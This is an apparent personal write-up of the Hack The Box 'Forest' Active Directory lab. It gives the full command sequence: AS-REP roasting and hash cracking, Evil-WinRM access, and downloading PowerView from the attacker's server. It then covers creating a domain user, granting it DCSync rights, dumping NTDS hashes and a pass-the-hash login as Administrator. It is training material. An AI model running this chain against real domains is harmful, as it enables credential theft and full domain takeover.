# Forest - Active Directory Lab

**Date**: 2024-10-26

## Scope

This lab focuses on exploiting an Active Directory (AD) environment with the domain `forest.htb`. I stored the target IP in a file for easy reference:

```bash
echo 10.10.10.161 > target
```

To resolve the domain, I added the entry to the `/etc/hosts` file.

---

## Enumeration

### 1. Initial Port Scan

A full port scan was conducted to identify open ports:

```bash
nmap -p- $(cat target) -v -oN nmap/full_scan.txt
```

**Open Ports Identified**:

```
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664-49703/tcp open  various (RPC, HTTP)
```

### 2. Service Version Enumeration

An aggressive scan on open ports provided additional details:

```bash
nmap -p$(cat tcp_ports) $(cat target) -A -T4 -v -oN nmap/tcp_ports_scan.txt -oX nmap/tcp_ports_scan.xml
```

**Key Findings**:
- **OS**: Windows Server 2016 Standard 14393
- **Domain**: `htb.local`
- **Host**: `FOREST`
- **Notable Services**: Kerberos, LDAP, SMB, WinRM, DNS

Additional details such as potential vulnerabilities and OS-specific configurations were recorded for exploitation.

---

## LDAP Enumeration

### 1. Password Policy

Unauthenticated access to LDAP allowed querying for the domain's password policy:

```bash
ldapsearch -H ldap://$(cat target):389/ -x -b "dc=htb,dc=local" "(objectClass=domain)"
```

**Password Policy Attributes**:
- `maxPwdAge`: -9223372036854775808
- `minPwdLength`: 7
- `lockoutThreshold`: 0

---

## SMB Enumeration

Using `enum4linux` to gather domain group and user information:

```bash
enum4linux -A forest.htb
```

**Identified Users in Domain Users Group**:
* `HTB\Administrator`
* `HTB\svc-alfresco`
* and others.

---

## Kerberos Enumeration

To identify accounts with "Do not require Kerberos preauthentication" set, I ran `GetNPUsers.py` from the Impacket toolkit:

```bash
GetNPUsers.py htb/ -usersfile users -no-pass -dc-ip $(cat target) -format hashcat
```

**Output**:
The account `svc-alfresco` was vulnerable to AS-REP Roasting, revealing a Kerberos hash, which was then cracked using `hashcat`.

```bash
hashcat -m 18200 svc-alfresco-ticket /usr/share/wordlists/rockyou.txt
```

---

## Exploitation Steps

### 1. Access via Evil-WinRM

With the cracked `svc-alfresco` credentials, I accessed the target via Evil-WinRM:

```bash
evil-winrm -i 10.10.10.161 -u "svc-alfresco" -p "******"
```

### 2. Privilege Escalation with BloodHound Analysis

I ran BloodHound to analyze potential attack paths:
1. Started `neo4j`:
   ```bash
   neo4j console
   ``` 

2. Prepared the environment and ran `bloodhound-python` to gather some informations:
   ```bash
   mkdir htb && cd htb
   sudo bloodhound-python -d htb.local -u "svc-alfresco" -p "******" -ns 10.10.10.161 -c all
   ```
3. I started analyzing the **Shortest Paths to Domain Admin**:

![Screenshot from 2024-11-01 11-35-16](https://github.com/user-attachments/assets/7a90bf5b-0bb5-4ec5-b675-720d65990871)

4. I marked the pawned user, *svc-alfresco*,as *Owned*:

![Screenshot from 2024-11-01 11-35-54](https://github.com/user-attachments/assets/0e00ccc5-7f53-41c9-93bd-6740dc92611b)

5. Then I filtered by *Shortest Paths From Owned Principal*:

![Screenshot from 2024-11-01 11-36-35](https://github.com/user-attachments/assets/260aebcc-8837-4c38-9ab1-3bea00c36d62)

6. I noticed that the user is in the **Account Operators** group, which could allow me to change passwords for privileged users or create a new user and add them to a privileged group. I then filtered again for *Shortest Paths to Domain Admin* and noticed the link to the **Exchange Windows Permissions** group. This group grants me the opportunity to perform a DCSync attack, which could elevate my privileges.

![Screenshot from 2024-11-01 11-36-59](https://github.com/user-attachments/assets/6e8438be-4d9c-41cc-961b-ccfea4e64cee)

![Screenshot from 2024-11-01 11-37-56](https://github.com/user-attachments/assets/153a6d0d-9568-4305-ab71-d93e8f867219)

![Screenshot from 2024-11-01 11-38-16](https://github.com/user-attachments/assets/1fc2e490-828d-4517-a567-79fb61961dd4)

I planned to create a new user, add them to the Exchange Windows Permissions group, and perform a DCSync attack.

### 3. Exploiting Account Operators Group Privileges

I checked if I had PowerSploit installed:

```bash
─# powersploit                

> powersploit ~ PowerShell Post-Exploitation Framework

/usr/share/windows-resources/powersploit
├── AntivirusBypass
├── CodeExecution
├── Exfiltration
├── Mayhem
├── Persistence
├── PowerSploit.psd1
├── PowerSploit.psm1
├── Privesc
├── README.md
├── Recon
├── ScriptModification
└── Tests
```

I moved to the Recon directory and I started a web server:

```bash
cd /usr/share/windows-resources/powersploit/Recon
python3 -m http.server 8081
```

In the WinRM session, I navigated to a temporary directory and uploaded the PowerView script.

```powershell
cd $env:TEMP
Invoke-WebRequest -Uri "http://<IP>:8081/PowerView.ps1" -OutFile PowerView.ps1
```

I created a new user called `addme`: 

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user addme asdfghj /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\AppData\Local\Temp> net user

User accounts for \\

-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     addme                    Administrator
andy                     DefaultAccount           Guest
HealthMailbox0659cc1     HealthMailbox670628e     HealthMailbox6ded678
HealthMailbox7108a4e     HealthMailbox83d6781     HealthMailbox968e74d
HealthMailboxb01ac64     HealthMailboxc0a90c9     HealthMailboxc3d7722
HealthMailboxfc9daad     HealthMailboxfd87238     krbtgt
lucinda                  mark                     santi
sebastien                SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb     SM_681f53d4942840e18     SM_75a538d3025e4db9a
SM_7c96b981967141ebb     SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b     svc-alfresco
The command completed with one or more errors.
```

I imported the PowerView module and added the new user to the new group.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\AppData\Local\Temp> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\AppData\Local\Temp> Add-DomainGroupMember -Identity 'Exchange Windows Permissi
*Evil-WinRM* PS C:\Users\svc-alfresco\AppData\Local\Temp> Get-DomainGroupMember -Identity 'Exchange Windows Permissions'


GroupDomain             : htb.local
GroupName               : Exchange Windows Permissions
GroupDistinguishedName  : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberDomain            : htb.local
MemberName              : addme
MemberDistinguishedName : CN=addme,CN=Users,DC=htb,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-3072663084-364016917-1341370565-10602

GroupDomain             : htb.local
GroupName               : Exchange Windows Permissions
GroupDistinguishedName  : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberDomain            : htb.local
MemberName              : Exchange Trusted Subsystem
MemberDistinguishedName : CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-3072663084-364016917-1341370565-1119

```

I setted the DCSync Right for the new user:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\AppData\Local\Temp> $SecPassword = ConvertTo-SecureString 'asdfghj' -AsPlain
Text -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\AppData\Local\Temp> $Cred = New-Object System.Management.Automation.PSCredential('HTB\addme', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\AppData\Local\Temp> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity "addme" -Rights DCSync
*Evil-WinRM* PS C:\Users\svc-alfresco\AppData\Local\Temp> 
```

### 4. Dumping Password Hashes

From my Kali machine I ran `secretsdump.py`, another impacket tool, to get out tickets:

```
└─# secretsdump.py -just-dc "addme":"asdfghj"@10.10.10.161                                    
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3***:32693b11e6aa****:::
....
[*] Cleaning up... 
                           
```

Now with the Administrator hashes I log in to the user account and grab the flag using `psexec.py`:

```bash
psexec.py "Administrator"@10.10.10.161 -hashes "aad3b435b51404eeaad3***:32693b11e6aa****"
```
The NT hash for the `Administrator` account allowed final access to retrieve the flag.

---

## Resources

- [HackTricks - Pentesting LDAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)
- [Impacket - GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/en/latest/)
- [PowerSploit on GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [Understanding DCSync Attacks](https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction/)
